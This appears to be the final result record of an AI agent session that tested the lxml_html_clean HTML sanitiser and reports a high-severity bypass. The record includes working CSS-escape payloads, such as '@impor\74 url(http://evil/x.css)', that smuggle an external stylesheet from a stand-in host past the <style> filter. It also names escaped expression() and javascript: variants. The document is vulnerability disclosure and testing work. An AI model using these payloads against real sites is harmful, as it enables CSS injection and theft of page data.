{"duration_api_ms":84397,"stop_reason":"end_turn","session_id":"94fb262f-c12b-416b-90b5-fce48bc9bc58","total_cost_usd":0.5006436000000001,"usage":{"input_tokens":22,"cache_creation_input_tokens":34136,"cache_read_input_tokens":376438,"output_tokens":7609,"output_tokens_details":{"thinking_tokens":1075},"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":"standard","cache_creation":{"ephemeral_1h_input_tokens":34136,"ephemeral_5m_input_tokens":0},"inference_geo":"not_available","iterations":[{"input_tokens":2,"output_tokens":929,"cache_read_input_tokens":46340,"cache_creation_input_tokens":0,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":0},"type":"message"}],"speed":"standard","fallback_credit":null},"modelUsage":{"claude-opus-5-5":{"inputTokens":22,"outputTokens":7609,"cacheReadInputTokens":376438,"cacheCreationInputTokens":34136,"webSearchRequests":0,"costUSD":0.5006436000000001,"contextWindow":1000000,"maxOutputTokens":128000,"thinkingTokens":1075,"canonicalModel":"claude-opus-5-5","provider":"firstParty","costBasis":"list"}},"permission_denials":[],"terminal_reason":"completed","fast_mode_state":"off","fast_mode_disabled_reason":"sdk_opt_in_required","subagent_stats":{"spawned":0,"requested":{"background":0,"foreground":0,"unset":0},"started_in_background":0,"max_depth":0,"spawned_by_subagents":0,"completed":0,"failed":0,"killed":{"parent":0,"user":0,"system":0},"refused":{"depth_limit":0,"concurrency_limit":0,"budget":0},"by_type":{}},"is_error":false,"num_turns":10,"subtype":"success","api_error_status":null,"result":"I found one real bug in `lxml_html_clean.clean`: an `@import` written with a CSS escape gets past the `<style>` sanitiser. I tested 4 properties and only this one failed. I've written it up as a High severity security bug.\n\n**What happens.** The default cleaner keeps `<style>` elements but is meant to remove `@import` from them. The code says \"The imported CSS can do anything; we just can't allow\" it. It only catches the plain spelling, though. Escaped spellings come through unchanged:\n\n```python\nfrom lxml_html_clean import clean_html\nclean_html(r'<div><style>@impor\\74 url(http://evil/x.css);</style></div>')\n# -> '<div><style>@impor\\74 url(http://evil/x.css);</style></div>'\nclean_html(r'<div><style>@\\69mport url(http://evil/x.css);</style></div>')\n# -> unchanged as well\n```\n\nBrowsers decode CSS escapes in at-rule names, so `@impor\\74` is read as `@import` and the attacker's external stylesheet loads. That opens the door to stealing page data through CSS and to faking parts of the page.\n\n**Why it slips through.** `_has_sneaky_javascript` deletes backslashes before checking (`style.replace('\\\\', '')`). That handles `@im\\port`, which is caught. But for a hex escape it leaves `@impor74`, which no longer matches `@import`. The same gap lets `e\\78pression(` and `j\\61vascript:` through inside `<style>` elements. Those two matter less, because `expression()` only works in old Internet Explorer and modern browsers don't run `javascript:` in CSS `url()`.\n\n**The 3 properties that passed:**\n- Escaped `@import`, `expression(` and `javascript:` inside `style=\"...\"` attributes are removed.\n- `javascript:` links broken up with tabs, newlines or mixed case are blanked in `href`, `src`, `action`, `formaction` and `background` on several tags.\n- Random tag-like input never crashes the cleaner and never leaves a `<script>` or `on*` event attribute in the output.\n\n**Fix.** The report proposes decoding CSS escapes in `_has_sneaky_javascript` before the checks run. I tried this by patching the method at runtime, and all 4 tests then passed. I haven't edited the library itself. The same decoding should also go into `_remove_sneaky_css_comments`, but I didn't test that part.\n\nFiles are in `runs/lxml-html-clean_r5/work/`:\n- `bug_report_lxml_html_clean_clean_2026-10-06_07-07_0j4a.md`\n- `test_clean.py`\n- `verify_fix.py`","ttft_ms":2384,"type":"result","duration_ms":96271,"uuid":"9a10d75f-7092-4e78-ae9c-8cde9a317f7d","ttft_stream_ms":2203,"time_to_request_ms":667,"first_content_frame_ms":2204,"queued_turn_count":0,"result_index":0}
